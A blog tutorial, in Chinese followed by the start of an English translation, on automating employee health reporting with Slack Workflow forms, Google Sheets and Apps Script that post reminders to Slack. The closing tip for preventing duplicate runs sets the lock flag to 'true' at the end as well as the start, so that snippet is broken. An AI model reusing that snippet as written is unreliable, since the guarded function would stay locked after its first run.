Email。開始動手做問題、優化方式、成果講完後，接下來來到實作環節；讓我們一起一步步完成這個自動化 Case。 篇幅有點長，可依照略過自己已了解的區塊，或直接從完成結果建立副本，邊看邊改邊學。完成結果表單： https://forms.gle/aqGDCELpAiMFFoyDA完成結果 Google Sheet：建立健康回報 Google Form 表單 &amp; 連結回覆到 Google Sheet步驟省略，有問題請直接 Google，這邊假定你已經建立＆連結好了健康回報表單。表單要記得勾選「Collect emails」：收集填寫者的 Email 以利之後比對名單用。怎麼連結回覆到 Google Sheet？於表單的上方切換到「回覆」點擊「Google Sheet Icon」即可。更改連結的 Sheet 名稱：這邊建議將連結的 Sheet 名稱由 Form Responses 1 改為 Responses 方便使用。建立 Slack Workflow Form 填寫入口傳統的 Google From 填寫入口有了之後，我們先來新增 Slack 填寫方式。於 Slack 任意對話視窗中找到「 輸入匡 下方 」的「藍色閃電⚡️」點擊下去在選單底下「Search shortcuts」中輸入「workflow」選擇「Open Workflow Builder」這邊會列出你建立的或參與的 Workflow，點選右上角「Create」建立新 Workflow第一步，輸入 workflow 名稱（Workflow Builder 介面顯示用）Workflow 觸發方式，選擇「Shortcut」目前一共有 5 種 slack workflow 觸發時間點： Shortcut：手動觸發「藍色閃電⚡️」選項，會出現在 workflow 選單中，點擊即可開始 workflow。 New channel member：當 Target Channel 有新成員加入時…. (EX: 歡迎訊息) Emoji reactions：當有人對 Target Channel 中的訊息按下指定表情符號時…(或許可拿來做重要訊息已讀請按 XXX Emoji，以此知道誰已讀了？) Scheduled date &amp; time：排程，指定時間到時…(EX: 定時發提醒回報訊息) Webhook：外部 Webhook 觸發，進階功能，可與第三方或自己架 API 串起內部工作流程。這邊我們選擇「Shortcut」建立手動觸發選項。選擇這個 Workflow Shortcut 要加入在「哪一個 Channel 輸入匡」之下及輸入「要顯示的名稱」 *一個 workflow shortcut 僅能加入在一個 channel 中Shortcut 建立完成！開始建立 workflow 步驟，點擊「Add Step」加入步驟選擇「Send a form」StepTitle ：輸入表單標題Add a question ：輸入第一個問題的題目（可自行在標題標注問題編號 ex: 1.,2.,3….）Choose a question type ： Short answer：單行輸入匡 Long answer：多行輸入匡 Select from a list：單選列表 Select a person：選擇一位同個 Workspace 內的成員 Select a channel or DM：選擇一位同個 Workspace 內的成員 或 Group DM 或 Channel「Select from a list」為例： Add list item：可新增一個選項 Default selection：選擇預設選項 Make theis required：將此問題設為必填 Add Question：可新增更多問題 右方「↓」「⬆」可調整順序、「✎」可展開編輯 可選擇是否要將表單填寫內容回傳至 Channel 或 某人也可以選擇傳送回覆到…： Person who clicked ….：點擊這個表單的人（形同填寫的人） Channel where workflow started：這個 workflow 添加到的 Channel表單完成後點擊「Save」儲存步驟。 *這邊我們取消勾選將表單填寫內容回傳，因為想要在後面步驟自行客製化訊息內容。將 Slack workflow from 與 Google Sheet 串接如果還沒有將 Google Sheet App 加入到 Slack 可先 點此安裝 APP 。繼上一步後，點擊「Add Step」加入新步驟，我們選擇 Google Sheets for Workflow Builder 的「Add a spreadsheet row」步驟。 首先要完成 Google 帳號的授權，點擊「Connect account」 Select a spreadsheet：選擇目標回應的 Google Sheet，請選擇一開始建立的 Google Form 之 Google Sheet Sheet：同上 Column name：第一個欲填入值的 Column，這邊先選問題ㄧ點擊右下角「Insert Variable」選擇「Response to 問題一…」，插入之後可由左下角「Add Column」加入其他欄位，以此類推完成問題二、問題三….填寫人的 Email，可選擇「Person who submitted form」在點擊插入的變數，選擇「Email」即可自動帶入填寫人的 Email。 Mention (default)：tag 該 User，Raw data 是 &lt;@User ID&gt; Name：User 名稱 Email：User EmailTimestamp 欄位比較 tricky 等下再補充設定方法，先點「Save」儲存後回到頁面右上角按「Publish」發布 Shortcut。看到發布成功訊息後，可以回到 Slack Channel 試試看。這時候點閃電之後會出現剛剛建立的 Workflow form，可以點來填寫玩玩。左：電腦 / 右：手機版我們可以填寫資訊「Submit」測試看看是否正常。成功！但可以看到 Timestamp 欄位為空，下一步我們來解決這個問題。Slack workflow from 取得填寫時間Slack workflow 沒有 current timestamp 的 global variable 可用，至少目前還沒有，只找到一篇 reddit 上的許願文章 。一開始異想天開在 Column Value 輸入 =NOW() 但這樣所有紀錄的時間永遠是當前時間，完全錯誤。同樣拜 reddit 那篇文章 大神網友提供的 tricky 方法，可以建一個乾淨的 Timestamp Sheet 裡面放一個列資料、欄位 =NOW() 先用 Update 迫使欄位變為最新，在 Select 得到當前 Timestamp。如上圖結構，點此 查看範例 。 Row： 類似 ID 的用處，直接設「1」，之後設定 Select &amp; Update 會要用到，告知資料列。 Timestamp：設定值 =NOW() 讓他永遠顯示當前時間 Value：用以觸發 Timestamp 欄位更新時間，內容隨意，這邊是把填寫人的 Email 塞進來放，反正只要能觸發更新就好。 可在 Sheet 上按右鍵「Hide Sheet」隱藏此 Sheet，因為沒有要讓外部使用。回到 Slack Workflow Builder 編輯剛剛 建立的 workflow form。點擊「Add Step」新增步驟：往下滑選擇「Update a spreadsheet row」「Select a spreadsheet」選擇剛剛的 Sheet，「Sheet」選擇新建立的「Timestamp」Sheet。「Choose a column to search」選擇「Row」，Define a cell value to find 輸入「1」。「Update these columns」「Column name」選擇「Value」、「Value」點選「Insert variable」-&gt;「Person who submitted」-&gt;「選擇 Email」。點「Save」完成！現在已經完成觸發 Sheet 中的 timestamp 更新了，再來是讀取出來用。回到編輯頁後再點一次「Add Step」加入新步驟，這次選「Select a spreadsheet row」我們要讀取 Timestamp 出來。Search 部分同「Update a spreadsheet row」，按「Save」。Save 完回到步驟列表頁，我們可以把滑鼠移到步驟上用拖曳更改順序。將順序改「Update a spreadsheet row」-&gt;「Select a spreadsheet」-&gt;「Add a spreadsheet row」。意即：Update 觸發 timestamp 更新 -&gt; 讀取 Timestamp -&gt; 在新增 Row 時拿來用。在「Add a spreadsheet row」點「Edit」編輯：拉到最下面按左下角「Add Column」在點右下角「Insert a variable」，找到「Select a spreadsheet」Section 中的「Timestamp」變數，注入進去。按「Save」儲存步驟後回到列表頁，右上角點「Publish Change」發布更改。這時候我們再測試一次 workflow shortcut 看看 timestamp 有沒有正常寫入。成功！Slack workflow form 增加填寫回執同 Google Form 填寫回執，Slack workflow form 也可以。在編輯步驟頁我們可以再加入一個步驟，點擊「Add Step」。這次選擇「Send a message」「Send this message to」選擇「Person who submitted form」訊息內容依序輸入題目名稱、「Insert a variable」選擇「Response to 題目 XXX」，也可在最後插入「Timestamp」，按「Save」儲存步驟後再按「Publish Changes」即可！ 另外也可使用「Send a message」將填寫結果傳送到特定 Channel 或 DM。成功！Slack workflow form 的設定大概到此結束，其他玩法可以自由搭配發揮。Google Sheet with App Script!接下我們需要撰寫 App Script 來處理填寫資料。首先在 Google Sheet 上方工具欄選擇「Tools」-&gt;「Script editor」可以點擊左上角給專案一個名稱。現在我們可以開始撰寫 App Script！App Script 是基於 Javascript 設計，所以可以直接使用 Javascript 程式碼用法搭配 Google Sheet 的 lib。將 Responses 的資料依照填寫日期分發到各日期的 Sheetfunction formatData() { var bufferSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Responses') // 儲存回覆的 Sheet 名稱 var rows = bufferSheet.getDataRange().getValues(); var fileds = []; var startDeleteIndex = -1; var deleteLength = 0; for(index in rows) { if (index == 0) { fileds = rows[index]; continue; } var sheetName = rows[index][0].toLocaleDateString(\"en-US\"); // 將 Date 轉換成 String，使用美國日期格式 MM/DD/YYYY var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetName); // 取得 MM/DD/YYYY Sheet if (sheet == null) { // 若無則新增 sheet = SpreadsheetApp.getActiveSpreadsheet().insertSheet(sheetName, bufferSheet.getIndex()); sheet.appendRow(fileds); } sheet.appendRow(rows[index]); // 將資料新增至日期 Sheet if (startDeleteIndex == -1) { startDeleteIndex = +index + 1; } deleteLength += 1; } if (deleteLength &gt; 0) { bufferSheet.deleteRows(startDeleteIndex, deleteLength); // 搬移到指定 Sheet 後，移除 Responses 裡的資料 }}在 Code 區塊中貼上以上程式碼，並按「control」+「s」儲存。再來我們要在 Sheet 中新增觸發按鈕（ 只能手動按按鈕觸發，無法在資料寫入時做自動分 ） 首先在建立一個新的 Sheet，取名「未填寫名單」 上方工具列選擇「Insert」-&gt;「Drawing」使用此介面，拉出一個按鈕。「Save and Close」後可調整、移動按鈕；點擊右上角「…」選擇「Assign script」輸入「formatData」function 名稱。可點擊加入的按鈕試試功能若出現 「Authorization Required」則點選「Continue」完成驗證在身份驗證的過程中會出現「Google hasn’t verified this app」這是正常的，因為我們寫的 App Script 沒有經過 Google 驗證，不過沒關係這是寫給自己用的。可點選左下角「Advanced」-&gt;「Go to Health Report (Responses) (unsafe)」點擊「Allow」 App Script 執行中會顯示「Running Script」這時候請勿再按，避免重複執行。 顯示執行成功後，才能再次執行。成功！將填寫資料依照日期分組。取得當前日期的 Sheet 與員工名單比對，產生未填寫名單 Sheet 的資料我們再加入一段 Code：// 與員工名單 Sheet ＆ 本日填寫 Sheet 比對，產出未填寫名單function generateUnfilledList() { var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('員工名單') // 員工名單 Sheet 名稱 var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('未填寫名單') // 未填寫名單 Sheet 名稱 var today = new Date(); var todayName = today.toLocaleDateString(\"en-US\"); var todayListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(todayName) // 取得本日 MM/DD/YYYY Sheet if (todayListSheet == null) { SpreadsheetApp.getUi().alert('找不到'+todayName+'本日的 Sheet 或請先執行「整理填寫資料」'); return; } var todayEmails = todayListSheet.getDataRange().getValues().map( x =&gt; x[1] ) // 取得本日 Sheet Email Address 欄位資料列表 (1 = Column B) // index start from 0, so 1 = Column B // output: Email Address,zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... todayEmails.shift() // 移除第一個資料，第一個是欄位名稱「Email Address」無意義 // output: zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... unfilledListSheet.clear() // 清除未填寫名單...準備重新填入資料 unfilledListSheet.appendRow([todayName+\" 未填寫名單\"]) // 第一行顯示 Sheet 標題 var rows = listSheet.getDataRange().getValues(); // 讀取員工名單 Sheet for(index in rows) { if (index == 0) { // 第一列是標題欄位列，存下來，讓後續產生資料也可補上第一列標題 unfilledListSheet.appendRow(rows[index]); continue; } if (todayEmails.includes(rows[index][3])) { // 如果本日 Sheet Email Address 中有此員工的 Email 則代表有填寫，continue 略過... (3 = Column D) continue; } unfilledListSheet.appendRow(rows[index]); // 寫入一行資料到未填寫名單 Sheet }}一樣儲存後，照前面加入 Code 的方法，再加入一個按鈕並 Assign script — 「generateUnfilledList」。完成後可點擊測試：未填寫名單產生成功！如果沒有出現內容請先確定： 員工名單已填寫，或可先輸入測試資料 要先完成「整理填寫資料」動作讀取未填寫名單 Sheet 組合出訊息並發送到指定 Slack Channel首先我們要加入 Incoming WebHooks App 到 Slack Channel，我們會透過此媒介來傳送訊息。 Slack 左下角「Apps」-&gt;「Add apps」 右邊搜尋匡搜尋「incoming」 點擊「Incoming WebHooks」-&gt;「Add」選擇未填寫訊息想要傳到的 Channel。記下最上方的「Webhook URL」往下滑可設定傳送訊息時，傳送 Bot 顯示的名稱及大頭貼；改完記得按「Save Settings」。回到我們的 Google Sheet Script再加入一段 Code：function postSlack() { var ui = SpreadsheetApp.getUi(); var result = ui.alert( '您確定要發送訊息?', '發送未填寫提醒訊息到 Slack Channel', ui.ButtonSet.YES_NO); // 避免誤觸，先詢問確認 if (result == ui.Button.YES) { var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('未填寫名單') // 未填寫名單 Sheet 名稱 var rows = unfilledListSheet.getDataRange().getValues(); var persons = []; for(index in rows) { if (index == 0 || index == 1) { // 略過標題、欄位標題那兩行 continue; } var person = (rows[index][4] == \"\") ? (rows[index][2]) : (\"&lt;@\"+rows[index][4]+\"&gt;\"); // 標記對象，如果有 slack uid 優先使用，沒有則單純顯示暱稱；2 = Column B / 4 = Column E if (person == \"\") { // 都沒視為異常資料，忽略 continue; } persons.push(\"• \"+person+'\\n') // 將對象存入陣列 } if (persons.length &lt;= 0) { // 無對象需要被標記通知時，大家都有填，取消訊息送出 return; } var preText = \"*[健康回報表公告:loudspeaker:]*\\n公司關心各位的身體健康，煩請以下隊友記得每日填寫健康狀況回報，謝謝:wink:\\n\\n今日未填健康狀況回報名單\\n\\n\" // 訊息開頭內容... var postText = \"\\n\\n填寫健康狀況回報能讓公司了解隊友們的身體狀況，煩請隊友們每日都要確實填寫唷&gt;&lt; 謝謝大家:woman-bowing::skin-tone-2:\" // 訊息結尾內容... var payload = { \"text\": preText+persons.join('')+postText, \"attachments\": [{ \"fallback\": \"這邊可放 Google Form 填寫連結\", \"actions\": [ { \"name\": \"form_link\", \"text\": \"前往健康狀況回報\", \"type\": \"button\", \"style\": \"primary\", \"url\": \"這邊可放 Google Form 填寫連結\" } ], \"footer\": \":rocket:小提示：點擊輸入匡下方的「:zap:️閃電」-&gt;「Shortcut Name」，即可直接填寫。\" } ] }; var res = UrlFetchApp.fetch('這邊輸入你 slack incoming app 的 Webhook URL',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) }) }}一樣儲存後，照前面加入 Code 的方法，再加入一個按鈕並 Assign script — 「postSlack」。完成後可點擊測試：成功！！！(顯示 ＠U123456 沒成功標記人是因為 ID 是我亂打的)到此主要的功能都已完成！ 備註 請注意官方建議使用新的 Slack APP API 的 chat.postMessage 來傳送訊息，Incoming Webhook 簡便的這個方式之後會棄用，這邊偷懶沒有使用，可搭配下一章「匯入員工名單」會需要 Slack App API 一起調整成新方法。匯入員工名單這邊會需要我們創建一個 Slack APP。1.前往 https://api.slack.com/apps2. 點擊右上角「Create New App」3. 選擇「 From scratch 」4. 輸入「 App Name 」跟 你想要加入的 Workspace5. 建立成功後，在左邊選單選擇「OAuth &amp; Permissions」設定頁6. 往下滑到 Scopes 區塊依次「Add an OAuth Scope」以下項目： channels:read users:read users:read.email 如果想改用 APP 發訊息可在此加入 chat.postMessage7. 回到最上面點擊「Install to workspace」or「Reinstall to workspace」 *如果 Scopes 有新增，也要回來這點重新安裝。8. 安裝完成，取得複製 Bot User OAuth Token9. 使用網頁版 Slack 打開想要匯入名單的 Channel從瀏覽器取得網址：https://app.slack.com/client/TXXXX/CXXXX其中 CXXXX 就是這個 Channel 的 Channel ID，記下此訊息。10.回到我們的 Google Sheet Script再加入一段 Code：function loadEmployeeList() { var formData = { 'token': 'Bot User OAuth Token', 'channel': 'Channel ID', 'limit': 500 }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/conversations.members', options); var data = JSON.parse(response.getContentText()); for (index in data[\"members\"]) { var uid = data[\"members\"][index]; var formData = { 'token': 'Bot User OAuth Token', 'user': uid }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/users.info', options); var user = JSON.parse(response.getContentText()); var email = user[\"user\"][\"profile\"][\"email\"]; var real_name = user[\"user\"][\"profile\"][\"real_name_normalized\"]; var title = user[\"user\"][\"profile\"][\"title\"]; var row = [title, real_name, real_name, email, uid]; // 依照 Column 填入 var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('員工名單'); // 員工名單 Sheet 名稱 listSheet.appendRow(row); }}但這次我們不需要再加入按鈕，因為匯入僅第一次需要；所以只需存擋後直接執行即可。首先按「control」+「s」存檔，上方下拉選單改選擇「loadEmployeeList」，點擊「Run」就會開始匯入名單到員工名單 Sheet。手動新增新員工資料爾後如果有新員工加入，可直接在員工名單 Sheet 新增一列，填入資訊，Slack UID 可在 Slack 上直接查詢：點擊要查看 UID 的對象，點擊「View full profile」點擊「More」選擇「Copy member ID」即是 UID。 UXXXXXDONE！以上所有步驟都已完成，可以開始自動化的追縱員工的健康狀況。完成檔如下，可直接從以下 Google Sheet 建立副本修改後使用：補充 如果想要用 Scheduled date &amp; time 定時發送 form 訊息，要注意這情況下的 form 只能被填一次，所以不適合在這邊使用…（至少目前版本還是這樣），所以 Scheduled 填寫提醒訊息依然只能用純文字＋Google Form 連結。 目前沒有辦法用超連結連到 Shortcut 打開 Form Google Sheet App Script 防止重複執行：如果要防止不小心在執行中又再次按到導致重複執行，可在 function 一開始加上：if (PropertiesService.getScriptProperties().getProperty('FUNCTIONNAME') == 'true') { SpreadsheetApp.getUi().alert('忙碌中...請稍後再試'); return;}PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');Function 執行結束時加上：PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');FUNCTIONNAME 取代為目標 Function 名稱。用一個 Global 變數管制執行。與 iOS 開發相關的應用可用來串 CI/CD，用 GUI 包裝原本醜醜的指令操作，例如搭配 Slack Bitrise APP，用 Slack Workflow form 組合啟動 Build 命令：送出之後會發送指令到有 Bitrise APP 的 private channel，EX:bitrise workflow:app_store|branch:develop|ENV[version]:4.32.0就能觸發 Bitrise 執行 CI/CD Flow。延伸閱讀 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 運用 Google Apps Script 轉發 Gmail 信件到 Slack Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate有任何問題及指教歡迎 與我聯絡 。有自動化相關優化需求也歡迎 發案給我 ，謝謝。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,436 Total Views Last Statistics Date: 2025-08-15 | 2,247 Views on Medium." }, { "title": "Slack Creates an Automated WFH Employee Health Reporting System", "url": "/posts/zrealm-dev/en/slack-creates-an-automated-wfh-employee-health-reporting-system-d61062833c1a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, automation, google-sheets, app-script, slack", "date": "2021-06-14 00:58:21 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Slack Creates an Automated WFH Employee Health Reporting SystemEnhancing work effici...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Slack Creates an Automated WFH Employee Health Reporting SystemEnhancing work efficiency with Slack Workflow combined with Google Sheets and App ScriptPhoto by Stephen Phillips — Hostreviews.co.ukIntroductionIn response to the shift to remote work, the company is concerned about the health of all members, requiring daily reports on their health status, which are centrally recorded and managed by People Operations.Our Flow Before Optimization [Automation] A Slack Channel sends a daily reminder message about the health form at 10 AM (the only automated part before optimization). Employees click the link to open the Google Form and fill out health questions. Data is stored back in Google Sheets for response records. [Manual] People Operations compares the list daily near the end of the workday to identify employees who forgot to fill out the form. [Manual] A reminder message is sent in the Slack Channel, tagging each employee who forgot to fill it out. The above is our company’s health reporting tracking process. Each company will have different processes based on its size and operational methods. This article serves only as an optimization example to learn about Slack Workflow usage and basic App Script writing; actual implementation should be done on a case-by-case basis.Issues Employees need to leave the Slack context to open the Google Form in a browser, which is especially inconvenient on mobile devices. Google Form can only automatically include email information, and cannot automatically add the respondent’s name or department information. Daily manual comparisons and tagging consume a lot of manpower and time.SolutionHaving done quite a few automation projects, I found this process suitable for automation due to its fixed data source (employee list), simple conditions, and routine actions. Initially, I didn’t implement it because I couldn’t find a good way to fill it out (actually, I couldn’t find an interesting point to study). I left it aside until I saw this post by Hai Zongli, which made me realize that Slack Workflow can do more than just send scheduled messages; it also has form capabilities:Image from: Hai ZongliNow I was eager to get started!If I could combine Slack Workflow Forms with automated messaging, wouldn’t that solve all the pain points mentioned above? The principle seemed feasible! So I began to implement it.Flow After OptimizationFirst, here’s the optimized flow and results. [Automation] A Slack Channel sends a daily reminder message about the health form at 10 AM. Employees fill out health questions via Google Form or Slack Workflow Form. Data is stored back in Google Sheets for response records. People Operations clicks the “Generate Unfilled List” button daily near the end of the workday. [Automation] App Script compares the employee list with the filled-out list to identify those who haven’t filled it out. [Automation] Clicking “Generate &amp; Send Message” automatically sends reminders to those who haven’t filled it out and tags them. Done!Results(Personal estimate) Each employee can reduce their filling time by about 30 seconds daily. People Operations can save about 20 to 30 minutes daily on this task.Operational PrinciplesUsing App Script to manage the Sheet: Store all externally input data in the Responses Sheet. Write an App Script function to distribute the Responses data into sheets by fill date; if a date sheet does not exist, create a new one, naming it directly by date for easy identification. Compare the current date’s sheet with the employee list to generate the unfilled list sheet’s data. Read the unfilled list sheet to compose messages and send them to the designated Slack Channel. Integrating the Slack APP API allows automatic reading of the specified channel to import the employee list. Message content uses the Slack UID Tag &lt;@UID&gt; to tag unfilled members.Identity VerificationThe identity verification information connecting Google Form and Slack is the email, so please ensure that all company colleagues use their company email to fill out the Google Form, and that their Slack personal information also includes their company email.Getting StartedAfter discussing the issues, optimization methods, and results, we now move on to the implementation phase; let’s complete this automation case step by step together. The article is a bit lengthy; feel free to skip sections you already understand, or directly create a copy from the completed result to learn while modifying.Completed result form: https://forms.gle/aqGDCELpAiMFFoyDACompleted result Google Sheet:Create a Health Reporting Google Form and Link Responses to Google SheetsSteps are omitted; if you have questions, please Google it. Here, I assume you have already created and linked the health reporting form.Remember to check “Collect emails” in the form:This collects the email of the respondent for later comparison.How to link responses to Google Sheets?Switch to “Responses” at the top of the form and click the “Google Sheets Icon.”Change the linked Sheet name:It is recommended to change the linked Sheet name from Form Responses 1 to Responses for easier use.Create a Slack Workflow Form EntryAfter establishing the traditional Google Form entry, let’s add a Slack filling method.In any Slack conversation window, find the “blue lightning ⚡️” below the input box and click it.In the menu below “Search shortcuts,” type “workflow” and select “Open Workflow Builder.”This will list the workflows you have created or participated in. Click the “Create” button in the upper right corner to create a new workflow.In the first step, enter the workflow name (for display in the Workflow Builder interface).Select “Shortcut” as the workflow trigger.Currently, there are five types of Slack workflow trigger points: Shortcut: Manually triggered by the “blue lightning ⚡️” option, which will appear in the workflow menu, allowing you to start the workflow by clicking it. New channel member: When a new member joins the target channel… (e.g., welcome message). Emoji reactions: When someone reacts to a message in the target channel with a specified emoji… (perhaps to mark important messages as read). Scheduled date &amp; time: Scheduled to trigger at a specified time… (e.g., to send a reminder message). Webhook: External webhook triggers, an advanced feature that can connect with third-party or self-hosted APIs to integrate internal workflows.Here, we choose “Shortcut” to create a manual trigger option.Select which channel this workflow shortcut will be added under and enter the “display name.” *A workflow shortcut can only be added to one channel.The shortcut is created! Now, let’s start adding steps to the workflow by clicking “Add Step.”Select the “Send a form” step.Title: Enter the form title.Add a question: Enter the title of the first question (you can label the question number in the title, e.g., 1., 2., 3…).Choose a question type: Short answer: Single-line input box. Long answer: Multi-line input box. Select from a list: Single-choice list. Select a person: Choose a member from the same workspace. Select a channel or DM: Choose a member from the same workspace or a group DM or channel.For example, with “Select from a list”: Add list item: You can add an option. Default selection: Choose a default option. Make this required: Set this question as mandatory. Add Question: You can add more questions. The right-side “↓” and “⬆” can adjust the order, and “✎” can expand for editing. You can choose whether to send the form responses back to the channel or to someone.You can also choose to send responses to…: Person who clicked…: The person who clicked this form (the same as the respondent). Channel where workflow started: The channel to which this workflow was added.After completing the form, click “Save” to save the step. *Here, we uncheck the option to send form responses back because we want to customize the message content in later steps.Connect Slack Workflow Form with Google SheetsIf you haven’t added the Google Sheets app to Slack yet, you can click here to install the app.Continuing from the previous step, click “Add Step” to add a new step, and select “Add a spreadsheet row” from Google Sheets for Workflow Builder. First, complete the Google account authorization by clicking “Connect account.” Select a spreadsheet: Choose the target Google Sheet for responses, which should be the Google Sheet linked to the Google Form you created earlier. Sheet: Same as above. Column name: The first column where you want to fill in values; here, select question one.Click the lower right “Insert Variable” to select “Response to question one…” After inserting, you can use the left “Add Column” to add other fields, and so on to complete questions two, three, etc.For the respondent’s email, you can choose “Person who submitted form.”Then click to insert the variable and select “Email” to automatically include the respondent’s email. Mention (default): Tag that user, raw data is &lt;@User ID&gt;. Name: User name. Email: User email.The Timestamp field is a bit tricky; I will provide additional setup methods later. For now, click “Save” to save and then click “Publish” in the upper right corner to publish the shortcut.After seeing the successful publication message, you can return to the Slack Channel to test it out.At this point, clicking the lightning bolt will show the workflow form you just created, which you can click to fill out and test.Left: Computer / Right: Mobile VersionWe can fill in the information and click “Submit” to test if it works correctly.Success! However, we can see that the Timestamp field is empty; let’s solve this problem next.Obtaining the Fill Time from Slack Workflow FormCurrently, there is no global variable for the current timestamp available in Slack workflows, at least not yet. I only found a wish post on reddit.Initially, I whimsically tried entering =NOW() in the Column Value, but this would make all records show the current time, which is completely incorrect.Thanks to the clever method provided by a user in that reddit post, you can create a clean Timestamp Sheet with a row of data and a column set to =NOW(), forcing the column to update to the latest time when you use Update, allowing you to select and get the current timestamp.As shown in the image, click here to view the example. Row: Used similarly to an ID, simply set it to “1”; this will be needed for Select &amp; Update later to indicate the data row. Timestamp: Set the value to =NOW() to always display the current time. Value: Used to trigger the Timestamp column to update the time; the content can be anything; here, I put the respondent’s email to trigger the update. You can right-click on the Sheet and select “Hide Sheet” to hide this sheet since it is not meant for external use.Now, return to the Slack Workflow Builder to edit the workflow form you just created.Click \"Add Step\" to add a new step:![](/assets/d61062833c1a/1*5lIcdnMQnmglNxaiY8fNUQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjgxMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Scroll down and select \"Update a spreadsheet row\"![](/assets/d61062833c1a/1*kRBL8iptGYd2Gsy7Lv6gGA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjgxMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }In \"Select a spreadsheet,\" choose the previously created Sheet, and in \"Sheet,\" select the newly created \"Timestamp\" Sheet.In \"Choose a column to search,\" select \"Row,\" and for \"Define a cell value to find,\" enter \"1.\"![](/assets/d61062833c1a/1*H8pb9TKvazhqiKKSCKcwCQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjgxMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }In \"Update these columns,\" select \"Column name\" as \"Value,\" then click \"Insert variable\" -&gt; \"Person who submitted\" -&gt; \"Select Email.\"Click \"Save\" to finish! The timestamp update in the Sheet has been successfully triggered, and now it's time to read it out.![](/assets/d61062833c1a/1*avXovKvXz9mlHOq2NWaf3A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjgxMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Return to the editing page and click \"Add Step\" again to add a new step. This time select \"Select a spreadsheet row\" to read the Timestamp.![](/assets/d61062833c1a/1*xEbDUkWd3utQ9QpllqSNHg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjgxMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The Search section is the same as \"Update a spreadsheet row,\" then click \"Save.\"![](/assets/d61062833c1a/1*VO3lfeTe1bxlL3xN3_wtwQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjkyMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After saving, return to the step list page. You can drag and drop to change the order of the steps.Change the order to \"Update a spreadsheet row\" -&gt; \"Select a spreadsheet\" -&gt; \"Add a spreadsheet row.\"This means: Update triggers the timestamp update -&gt; Read the Timestamp -&gt; Use it when adding a new Row.In \"Add a spreadsheet row,\" click \"Edit\":![](/assets/d61062833c1a/1*8IH_AJZn0YHFk5obccmUYg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjkyMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Scroll to the bottom and click \"Add Column\" in the lower left corner, then click \"Insert a variable\" in the lower right corner, find the \"Timestamp\" variable in the \"Select a spreadsheet\" section, and inject it.![](/assets/d61062833c1a/1*-4vk8fjRwkIVSY4Pu-C6VA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjkyMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After clicking \"Save\" to save the step, return to the 